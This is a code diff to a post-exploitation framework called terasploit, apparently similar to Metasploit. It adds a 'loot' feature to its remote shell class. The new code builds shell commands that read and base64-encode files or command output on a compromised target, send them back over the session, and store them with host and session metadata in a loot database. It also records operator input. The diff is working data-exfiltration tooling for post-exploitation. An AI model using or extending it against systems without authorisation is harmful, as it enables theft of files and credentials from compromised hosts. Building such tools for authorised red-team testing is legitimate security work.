@@ -3,12 +3,15 @@ import contextlib
 import dataclasses
 import platform
 import select
+import shlex
+import sqlite3
 import sys
 import time
 from dataclasses import field
 from typing import Any
 
 from terasploit.ui.printf import error, info, print_line, warning
+from terasploit.ui.record import recorder
 
 
 # Standard network buffer size - bytes read per recv() call.
@@ -25,9 +28,12 @@ class TransferState:
     mode: bool = False
     file: Any | None = None
     buffer: bytearray = field(default_factory=bytearray)
+    start_terminator: bytes = b"---TERASPLOIT_SHELL_SOF---"
     terminator: bytes = b"---TERASPLOIT_SHELL_EOF---"
     # Deadline (monotonic seconds) set when a transfer begins.
     deadline: float = 0.0
+    artifact_name: str | None = None
+    artifact_metadata: dict = field(default_factory=dict)
 
 
 class BaseShell:
@@ -35,9 +41,10 @@ class BaseShell:
 
     PLATFORM_LABEL: str = "Generic"
 
-    def __init__(self, session, session_registry_fn=None):
+    def __init__(self, session, session_registry_fn=None, loot_manager=None):
         self._session = session
         self._registry_fn = session_registry_fn or (lambda: {})
+        self._loot_manager = loot_manager
         self._running = False
         self._raw_mode = False  # True → bypass command interception, send everything verbatim
         self._sock = session.transport.sock
@@ -83,6 +90,7 @@ class BaseShell:
             self._session.runtime.alive = False
 
         finally:
+            self._stop_transfer()
             self.cleanup_socket_state()
 
     def cleanup_socket_state(self):
@@ -122,6 +130,7 @@ class BaseShell:
                         if not user_input:
                             self._running = False
                             break
+                        recorder.write_input(user_input)
                         self._handle_user_input(user_input.strip())
 
             except KeyboardInterrupt, EOFError:
@@ -161,29 +170,67 @@ class BaseShell:
         if self._transfer_state.terminator not in self._transfer_state.buffer:
             return
 
-        actual_data, _ = self._transfer_state.buffer.split(self._transfer_state.terminator, 1)
+        transfer_data, _ = self._transfer_state.buffer.split(self._transfer_state.terminator, 1)
         try:
-            binary_content = base64.b64decode(actual_data.strip(), validate=True)
+            start = transfer_data.find(self._transfer_state.start_terminator)
+            if start == -1:
+                raise ValueError("Transfer start marker was not received.")
+
+            encoded_content = bytes(transfer_data[start + len(self._transfer_state.start_terminator) :])
+            lines = encoded_content.strip().splitlines()
+            if lines and lines[0] in {b"OK", b"ERR"}:
+                status, *payload = lines
+                encoded_content = b"".join(payload)
+                if status == b"ERR":
+                    detail = base64.b64decode(encoded_content).decode("utf-8", errors="replace")
+                    raise RuntimeError(f"Remote file read failed: {detail}")
+            else:
+                encoded_content = b"".join(encoded_content.split())
+            binary_content = base64.b64decode(encoded_content, validate=True)
 
             if self._transfer_state.file is not None:
                 self._transfer_state.file.write(binary_content)
 
-            info(f"Transfer complete. Verified {len(binary_content)} bytes.")
+            if self._transfer_state.artifact_name is not None:
+                if self._loot_manager is None:
+                    raise RuntimeError("Loot storage is unavailable in this session.")
 
-        except (ValueError, OSError) as exc:
-            error(f"Data corruption during decoding: {exc}")
+                record = self._loot_manager.store_bytes(
+                    binary_content,
+                    self._transfer_state.artifact_name,
+                    **self._transfer_state.artifact_metadata,
+                )
+                info(f"Loot stored as record {record['id']}: {record['filename']} ({len(binary_content)} bytes).")
+
+            else:
+                info(f"Transfer complete. Verified {len(binary_content)} bytes.")
+
+        except (ValueError, OSError, RuntimeError, TypeError, sqlite3.Error) as exc:
+            error(f"Data transfer failed: {exc}")
 
         finally:
             self._stop_transfer()
 
-    def _start_transfer(self, local_path, timeout: float = TRANSFER_TIMEOUT):
-        """Open local_path for writing and arm the transfer state machine."""
+    def _start_transfer(
+        self,
+        local_path=None,
+        *,
+        artifact_name=None,
+        artifact_metadata=None,
+        timeout: float = TRANSFER_TIMEOUT,
+    ):
+        """Prepare a local-file or managed-loot transfer."""
+        if self._transfer_state.mode:
+            warning("A file transfer is already in progress.")
+            return False
 
         try:
-            with open(local_path, "wb") as file:
-                self._transfer_state.file = file
+            if local_path is not None:
+                self._transfer_state.file = open(local_path, "wb")  # noqa: SIM115
 
             self._transfer_state.buffer = bytearray()
+            self._transfer_state.artifact_name = artifact_name
+            self._transfer_state.artifact_metadata = dict(artifact_metadata or {})
             self._transfer_state.mode = True
             self._transfer_state.deadline = time.monotonic() + timeout
             return True
@@ -202,6 +249,8 @@ class BaseShell:
         self._transfer_state.mode = False
         self._transfer_state.buffer = bytearray()
         self._transfer_state.deadline = 0.0
+        self._transfer_state.artifact_name = None
+        self._transfer_state.artifact_metadata = {}
 
     def _handle_user_input(self, raw):
         """Dispatch a line of user input to a built-in command or the remote."""
@@ -217,7 +266,16 @@ class BaseShell:
             self._send(raw)
             return
 
-        parts = raw.split()
+        if raw.split(None, 1)[0].lower() == "loot":
+            try:
+                parts = shlex.split(raw, posix=self.PLATFORM_LABEL.lower() != "windows")
+            except ValueError as exc:
+                warning(f"Invalid loot command syntax: {exc}")
+                return
+            if self.PLATFORM_LABEL.lower() == "windows":
+                parts = [part[1:-1] if len(part) >= 2 and part[0] == part[-1] and part[0] in {"'", '"'} else part for part in parts]
+        else:
+            parts = raw.split()
         command = parts[0].lower()
 
         if command in ("background", "bg"):
@@ -289,28 +347,105 @@ class BaseShell:
         info("Entered raw shell mode. Type 'exit_raw' to return to normal mode.")
 
     def cmd_loot(self, args):
-        """Run a command on the target and save the output to a local file."""
+        """Capture command output or collect an existing remote file as loot."""
+        if args and args[0] in {"--remote", "-r"}:
+            self._loot_remote_file(args[1:])
+            return
+
         if len(args) < 2:
-            warning("Usage: loot <local_file> <command...>")
+            warning("Usage: loot <local_file> <command...> | loot --remote <remote_path> [--name <filename>]")
             return
 
         local_path = args[0]
+        artifact_name = local_path.replace("\\", "/").rsplit("/", 1)[-1]
+        if not artifact_name:
+            error("The local output path must include a filename.")
+            return
+
         remote_cmd = " ".join(args[1:])
 
-        info(f"Capturing output of '{remote_cmd}' → {local_path}")
+        if self._loot_manager is None:
+            error("Loot storage is unavailable in this session.")
+            return
 
-        if not self._start_transfer(local_path):
+        info(f"Capturing output of '{remote_cmd}' → {local_path} and loot/{artifact_name}")
+        address = self._session.transport.addr[0]
+        metadata = {
+            "host": address,
+            "session_id": self._session.session_id,
+            "module": getattr(self._session, "module", None),
+            "source": "session",
+            "description": remote_cmd,
+            "platform": self.PLATFORM_LABEL.lower(),
+            "workspace": getattr(self._session, "workspace", None),
+        }
+
+        if not self._start_transfer(local_path, artifact_name=artifact_name, artifact_metadata=metadata):
             return
 
         # Wrap the command so its output is base64-encoded on the target,
         # then terminated with the sentinel — same mechanism as download.
         loot_cmd = self._build_loot_cmd(remote_cmd)
-        self._send(loot_cmd)
+        if not self._send(loot_cmd):
+            self._stop_transfer()
+
+    def _loot_remote_file(self, args):
+        """Retrieve an existing remote file and register it in Loot Manager."""
+        if not args:
+            warning("Usage: loot --remote <remote_path> [--name <filename>]")
+            return
+
+        remote_path = args[0]
+        artifact_name = remote_path.replace("\\", "/").rsplit("/", 1)[-1]
+        if len(args) > 1:
+            if len(args) != 3 or args[1] != "--name" or not args[2]:
+                warning("Usage: loot --remote <remote_path> [--name <filename>]")
+                return
+            artifact_name = args[2]
+
+        if self._loot_manager is None:
+            error("Loot storage is unavailable in this session.")
+            return
+        if not artifact_name:
+            error("Unable to determine the remote filename; specify --name.")
+            return
+
+        metadata = {
+            "host": self._session.transport.addr[0],
+            "session_id": self._session.session_id,
+            "module": getattr(self._session, "module", None),
+            "source": "remote_file",
+            "description": f"Remote file: {remote_path}",
+            "platform": self.PLATFORM_LABEL.lower(),
+            "workspace": getattr(self._session, "workspace", None),
+        }
+        info(f"Collecting remote file '{remote_path}' → loot/{artifact_name}")
+        if not self._start_transfer(artifact_name=artifact_name, artifact_metadata=metadata):
+            return
+
+        command = self._build_remote_file_cmd(remote_path)
+        if not self._send(command):
+            self._stop_transfer()
+
+    def _build_remote_file_cmd(self, remote_path):
+        """Build a framed Base64 command that reads one remote file."""
+        safe_path = shlex.quote(remote_path)
+        error_text = "Remote file does not exist or is not readable."
+        encoded_error = base64.b64encode(error_text.encode()).decode("ascii")
+        return (
+            "printf '%s\n' '---TERASPLOIT_SHELL_SOF---'; "
+            f"if [ -f {safe_path} ] && [ -r {safe_path} ]; then "
+            "printf '%s\n' 'OK'; "
+            f"base64 {safe_path}; "
+            "else printf '%s\n' 'ERR'; "
+            f"printf '%s\n' '{encoded_error}'; fi; "
+            "printf '%s\n' '---TERASPLOIT_SHELL_EOF---'"
+        )
 
     def _build_loot_cmd(self, remote_cmd: str) -> str:
         """Build the target-side command that base64-encodes output and appends the sentinel."""
         safe_cmd = remote_cmd.replace("'", "'\\''")
-        return f"( {safe_cmd} ) 2>&1 | base64; echo '---TERASPLOIT_SHELL_EOF---'"
+        return f"printf '%s%s\\n' '---TERASPLOIT_' 'SHELL_SOF---'; ( {safe_cmd} ) 2>&1 | base64; printf '%s%s\\n' '---TERASPLOIT_' 'SHELL_EOF---'"
 
     def cmd_help(self):
         """Print available built-in commands. Subclasses supply sections."""
@@ -330,7 +465,8 @@ class BaseShell:
                     ("exit / quit", "Close this session permanently"),
                     ("sessions", "List all open sessions"),
                     ("shell", "Enter raw passthrough mode (no command interception)"),
-                    ("loot <f> <cmd>", "Run command on target and save output to local file"),
+                    ("loot <file> <cmd>", "Save remote output locally and register it in loot"),
+                    ("loot --remote <path>", "Collect an existing remote file into Loot Manager"),
                 ],
             ),
             (
